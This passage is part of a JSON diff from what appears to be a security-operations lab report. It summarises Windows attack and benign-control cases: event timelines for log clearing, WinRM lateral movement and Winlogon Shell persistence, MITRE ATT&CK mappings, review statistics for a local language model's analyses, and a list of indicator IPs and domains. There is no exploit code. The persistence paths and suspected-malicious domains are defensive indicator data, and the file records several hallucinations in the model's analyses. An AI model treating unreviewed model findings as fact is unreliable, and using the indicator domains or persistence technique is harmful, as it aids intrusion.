+          "summary": "Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): lsarpc, source 10.0.2.17",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-01-20T07:30:10.6600994Z",
+          "ts_quality": "original_utc",
+          "summary": "Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): srvsvc, source 10.0.2.17",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 4,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 4,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-002643-c097",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 17.46,
+        "wall_seconds": 69.76,
+        "validator_flags": 0,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 0,
+          "low": 0
+        },
+        "review_status": "Approved",
+        "analyst": "Mohammed walid",
+        "correct_findings": 4,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 1,
+        "source": "Week-2/Results/AN-20261018-002643-c097/analysis.json",
+        "all_runs": [
+          "AN-20261017-232845-51bb",
+          "AN-20261017-234327-314a",
+          "AN-20261018-002643-c097",
+          "AN-20261103-011039-c170"
+        ]
+      },
+      "human_review": {
+        "status": "Approved",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-002643-c097/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1070.001",
+          "name": "Indicator Removal: Clear Windows Event Logs",
+          "tactic": "Defense Evasion",
+          "confidence": "observed_pattern",
+          "basis": "Event 1102 Security audit log cleared by Administrator (RT-02 verified timeline)"
+        },
+        {
+          "technique": "T1033",
+          "name": "System Owner/User Discovery",
+          "tactic": "Discovery",
+          "confidence": "candidate",
+          "basis": "Event 5145 winreg/lsarpc access checks from 10.0.2.17 in the psloggedon dataset; intent undetermined"
+        }
+      ],
+      "stage_id": "S6"
+    },
+    {
+      "case_id": "RT-03",
+      "title": "WinRM remote command execution on DC",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Verified-Timeline.csv",
+          "sha256": "68ab39716c3756da1e2a98a47e05049c8ef0a1510ff231d4020b6a543a314e94"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Case-Study.md",
+          "sha256": "d7e6fff23499e5c725b802adb5396eb2e8af689b8c255e807bed98470a4ee85b"
+        }
+      ],
+      "facts": {
+        "host": "DC1.insecurebank.local",
+        "images": [
+          "winrshost.exe",
+          "cmd.exe",
+          "ipconfig.exe"
+        ]
+      },
+      "events": [
+        {
+          "ts_original": "2019-05-16T01:31:36.4268707Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 on DC1.insecurebank.local: winrshost.exe",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-05-16T01:31:36.4548923Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 on DC1.insecurebank.local: cmd.exe",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-05-16T01:31:36.4568918Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 on DC1.insecurebank.local: ipconfig.exe",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 3,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-010933-ca14",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 16.72,
+        "wall_seconds": 70.9,
+        "validator_flags": 5,
+        "validator_severity_counts": {
+          "high": 3,
+          "medium": 2,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 4,
+        "incorrect_findings": 3,
+        "hallucinations_recorded": 1,
+        "source": "Week-2/Results/AN-20261018-010933-ca14/analysis.json",
+        "all_runs": [
+          "AN-20261018-004828-3c5c",
+          "AN-20261018-010933-ca14"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-010933-ca14/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1021.006",
+          "name": "Remote Services: Windows Remote Management",
+          "tactic": "Lateral Movement",
+          "confidence": "observed_pattern",
+          "basis": "winrshost.exe spawning cmd.exe on DC1 (RT-03 verified timeline); client identity unverified"
+        },
+        {
+          "technique": "T1016",
+          "name": "System Network Configuration Discovery",
+          "tactic": "Discovery",
+          "confidence": "observed_pattern",
+          "basis": "ipconfig.exe child of the WinRM-spawned cmd.exe (RT-03 verified timeline)"
+        }
+      ],
+      "stage_id": "S7"
+    },
+    {
+      "case_id": "RT-04",
+      "title": "Winlogon Shell persistence",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv",
+          "sha256": "3cb94bf61e2c258b1e8c8eecc1b765773a7c23bccbaf2f0d7d27c2f1a72e7f18"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Case-Study.md",
+          "sha256": "2103bea92ecc23e8436340d50c13c6dddb96cbdbd4cce96fbde004a35b8c72ed"
+        }
+      ],
+      "facts": {
+        "host": "IEWIN7",
+        "payload_path": "C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe",
+        "registry_key": "HKU\\S-1-5-21-3583694148-1414552638-2922671848-1000\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+        "dropper": "C:\\Users\\IEUser\\Downloads\\a.exe"
+      },
+      "events": [
+        {
+          "ts_original": "2019-06-14T22:22:17.9883707Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 process create C:\\Users\\IEUser\\Downloads\\a.exe (parent C:\\Windows\\explorer.exe)",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:22:21.5039957Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 11 file create C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe by C:\\Users\\IEUser\\Downloads\\a.exe",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:22:21.5352457Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 13 registry set HKU\\S-1-5-21-3583694148-1414552638-2922671848-1000\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell = \"C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe\",explorer.exe",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:23:13.8946207Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 process create C:\\Windows\\System32\\userinit.exe (parent C:\\Windows\\System32\\winlogon.exe)",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:23:13.9571207Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 process create C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe (parent C:\\Windows\\System32\\userinit.exe)",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:23:13.9727457Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 process create C:\\Windows\\explorer.exe (parent C:\\Windows\\System32\\userinit.exe)",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2019-06-14T22:23:16.5928629Z",
+          "ts_quality": "original_utc",
+          "summary": "Sysmon 1 process create C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe (parent C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe)",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 7,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 3,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-022126-c65b",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 14.65,
+        "wall_seconds": 118.56,
+        "validator_flags": 1,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 1,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 8,
+        "incorrect_findings": 3,
+        "hallucinations_recorded": 2,
+        "source": "Week-2/Results/AN-20261018-022126-c65b/analysis.json",
+        "all_runs": [
+          "AN-20261018-014225-d45b",
+          "AN-20261018-015226-37b2",
+          "AN-20261018-022126-c65b"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-022126-c65b/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1547.004",
+          "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
+          "tactic": "Persistence",
+          "confidence": "observed_pattern",
+          "basis": "Sysmon ID 13 sets Winlogon\\Shell to include BRE6BgE2JubB.exe; payload later started by userinit.exe (RT-04 case study)"
+        }
+      ],
+      "stage_id": "S5"
+    },
+    {
+      "case_id": "BT-01",
+      "title": ".NET native-image optimisation (benign candidate)",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-Case-Study.md",
+          "sha256": "207a480d3ce7ca9b8e0cbbfeeacd63922445e67382c1e8afa26ebefe680021ac"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json",
+          "sha256": "923489eda20e1644e6dd4fb56292c98a32082f9c6e06dd04150ed4b1800d8312"
+        }
+      ],
+      "facts": {
+        "host": "WIN-TKC15D7KHUR",
+        "event_ids": [
+          "1"
+        ],
+        "images": {
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe": 6
+        }
+      },
+      "events": [
+        {
+          "ts_original": "2022-04-04T14:05:42.0544347Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:05:42.1749967Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:05:42.4217019Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:05:42.6819078Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:05:44.2481373Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:05:44.4604920Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Sysmon Event 1 on WIN-TKC15D7KHUR C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorsvw.exe",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-01/BT-01-focused.json"
+        }
+      ],
+      "event_count_total": 6,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-160709-eabf",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 15.31,
+        "wall_seconds": 112.43,
+        "validator_flags": 2,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 2,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 7,
+        "incorrect_findings": 3,
+        "hallucinations_recorded": 3,
+        "source": "Week-2/Results/AN-20261018-160709-eabf/analysis.json",
+        "all_runs": [
+          "AN-20261018-031118-23a5",
+          "AN-20261018-160709-eabf"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-160709-eabf/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": true,
+      "limitations": [
+        "Benign candidate only: approved/benign operation is not independently proven."
+      ],
+      "attack": [],
+      "stage_id": "FP"
+    },
+    {
+      "case_id": "BT-02",
+      "title": "SYSTEM service logons (benign candidate)",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-Case-Study.md",
+          "sha256": "0c6ee319d32f63fea9a3794703e318871061b5ccdbb4c5721efe3704cfe5dfb7"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-focused.json",
+          "sha256": "847f9aba4e7ac7d5d383a89bb49c4e37c2f848297e8c46a62c36729f0b7f9207"
+        }
+      ],
+      "facts": {
+        "host": "WIN-TKC15D7KHUR",
+        "event_ids": [
+          "4624",
+          "4672"
+        ],
+        "images": {}
+      },
+      "events": [
+        {
+          "ts_original": "2022-04-04T14:06:06.7223244Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Security-Auditing Event 4624 on WIN-TKC15D7KHUR SYSTEM",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:06:06.7223631Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Security-Auditing Event 4672 on WIN-TKC15D7KHUR",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:06:11.2761279Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Security-Auditing Event 4624 on WIN-TKC15D7KHUR SYSTEM",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:06:11.2761733Z",
+          "ts_quality": "original_utc",
+          "summary": "Microsoft-Windows-Security-Auditing Event 4672 on WIN-TKC15D7KHUR",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-02/BT-02-focused.json"
+        }
+      ],
+      "event_count_total": 4,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-160835-f96a",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 17.09,
+        "wall_seconds": 85.17,
+        "validator_flags": 1,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 1,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 6,
+        "incorrect_findings": 4,
+        "hallucinations_recorded": 4,
+        "source": "Week-2/Results/AN-20261018-160835-f96a/analysis.json",
+        "all_runs": [
+          "AN-20261018-031219-895a",
+          "AN-20261018-160835-f96a"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-160835-f96a/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": true,
+      "limitations": [
+        "Benign candidate only: approved/benign operation is not independently proven."
+      ],
+      "attack": [],
+      "stage_id": "FP"
+    },
+    {
+      "case_id": "BT-03",
+      "title": "Service start/stop transitions (benign candidate)",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-Case-Study.md",
+          "sha256": "1a0bcf2281711a99105c1e6ec6a9cb7dcf41e33770909db7d49326e73416832c"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json",
+          "sha256": "7d5df07e5ac203141a3f1d8325fa6bdcf06f0caebc1fa7a5c7bfe94dc999f4a8"
+        }
+      ],
+      "facts": {
+        "host": "WIN-TKC15D7KHUR",
+        "event_ids": [
+          "7036"
+        ],
+        "images": {}
+      },
+      "events": [
+        {
+          "ts_original": "2022-04-04T14:09:49.5384871Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR Windows Biometric Service",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:11:00.1552809Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR Background Intelligent Transfer Service",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:11:28.7125046Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR Microsoft Passport",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:11:47.8527230Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR Software Protection",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:12:18.3477921Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR Software Protection",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        },
+        {
+          "ts_original": "2022-04-04T14:13:44.1240769Z",
+          "ts_quality": "original_utc",
+          "summary": "Service Control Manager Event 7036 on WIN-TKC15D7KHUR AppX Deployment Service (AppXSVC)",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Windows-Benign/BT-03/BT-03-focused.json"
+        }
+      ],
+      "event_count_total": 6,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261018-160932-6d1c",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 18.77,
+        "wall_seconds": 56.2,
+        "validator_flags": 2,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 0,
+          "low": 2
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed walid",
+        "correct_findings": 8,
+        "incorrect_findings": 0,
+        "hallucinations_recorded": 4,
+        "source": "Week-2/Results/AN-20261018-160932-6d1c/analysis.json",
+        "all_runs": [
+          "AN-20261018-031340-9773",
+          "AN-20261018-160932-6d1c"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed walid",
+        "source": "Week-2/Results/AN-20261018-160932-6d1c/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": true,
+      "limitations": [
+        "Benign candidate only: approved/benign operation is not independently proven."
+      ],
+      "attack": [],
+      "stage_id": "FP"
+    }
+  ],
+  "observables": [
+    {
+      "type": "ipv4",
+      "value": "183.62.140.253",
+      "cases": [
+        "LT-01",
+        "SIEM-AUTH-002"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.132",
+      "cases": [
+        "NT-01",
+        "NT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "bloodyswif.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk001-f137fa53a835cab9745e769d.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk017-6814d168efb413495592a30a.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk034-20ce2c76b69c7c9b9c46dbe9.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk050-34794a1a92aba55a84b23ab2.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk067-300a1a1d12c721a19915c978.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk084-0cd8bb7ce828a50395bf5328.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk100-79e128737488911d9a02ae78.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk117-29ce0e62c46f6577e7cdd4cc.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk133-b34657f154de097c7c1b01da.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk150-abe40348a8dd0c1b937adb0c.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk167-62871f01fd6e9380b53795fb.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk183-f4df5747aa53924340bcd561.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk200-859ef48e43462029ecd421ff.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk216-cd05f608e727d855357a48bd.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk233-f001b3344bc99da19a864543.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "chunk250-ef566286fc3a33e1c288d41c.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "finickypwk.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "kickykiduz.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "leggelatez.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "mail.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "miniatureyu.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "ntp.ubuntu.com.localdomain",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "plodnittpw.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "portal.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "savorraiykj.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "shoefeatthe.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
